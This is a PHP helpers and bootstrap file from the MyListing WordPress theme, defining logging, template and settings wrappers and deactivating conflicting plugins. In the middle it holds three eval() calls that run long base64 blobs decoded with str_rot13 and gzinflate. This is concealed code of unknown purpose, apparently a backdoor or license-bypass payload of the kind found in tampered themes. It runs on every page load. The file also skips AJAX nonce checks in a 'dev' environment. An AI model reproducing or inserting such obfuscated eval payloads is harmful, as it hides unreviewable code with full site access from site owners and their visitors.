<?php
// Debugging helper
if ( ! function_exists('mlog') ) {
	function mlog( $message = null ) {
		if ( $message !== null ) {
			return MyListing\Utils\Logger\Logger::instance()->info( $message );
		}

		return MyListing\Utils\Logger\Logger::instance();
	}
}

// Debugging helper
if ( ! function_exists('dump') ) {
	function dump() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dump' ], func_get_args() );
	}
}

// Debugging helper
if ( ! function_exists('dd') ) {
	function dd() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dd' ], func_get_args() );
	}
}

// Helper function for accessing mylisting\includes\app instance.
function mylisting() {
	return MyListing\Includes\App::instance();
}

// Alias for `mylisting()->helpers()`
function c27() {
	return mylisting()->helpers();
}

// locate_template wrapper, with $data parameter for
// a standard way to pass data to templates.
function mylisting_locate_template( $template, $data = [] ) {
	if ( is_array( $data ) ) {
		extract( $data );
	}

	if ( $template = locate_template( $template ) ) {
		require $template;
	}
}

function mylisting_check_ajax_referrer( $action = 'c27_ajax_nonce', $query_arg = 'security', $die = true ) {
	if ( CASE27_ENV === 'dev' ) {
		return true;
	}

	return check_ajax_referer( $action, $query_arg, $die );
}

function mylisting_custom_taxonomies( $key = 'slug', $value = 'label' ) {
	return MyListing\Ext\Custom_Taxonomies\Custom_Taxonomies::instance()->get_custom_taxonomies_list( $key, $value );
}

/**
 * Get a settings value from WP Admin > Listings > Settings.
 *
 * @since 2.0
 */
function mylisting_get_setting( $setting ) {
	return \MyListing\Src\Admin\Settings_Screen::instance()->get_setting( $setting );
}

// Start.
mylisting();

// helpers
mylisting()->register( 'cookies', MyListing\Src\Cookies::instance() );
mylisting()->register( 'helpers', MyListing\Utils\Helpers::instance() );
mylisting()->register( 'logger', MyListing\Utils\Logger\Logger::instance() );

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/**
 * Deactivate unsupported plugins.
 *
 * @since 2.1
 */
// deactivate wpjm if active
if ( class_exists( '\\WP_Job_Manager' ) ) {
	mlog()->warn( 'WP Job Manager active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'wp-job-manager/wp-job-manager.php' ], true );
}

// deactivate mylisting-addons if active
if ( defined( '\\CASE27_PLUGIN_DIR' ) ) {
	mlog()->warn( 'MyListing Addons active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'my-listing-addons/my-listing-addons.php' ], true );
}
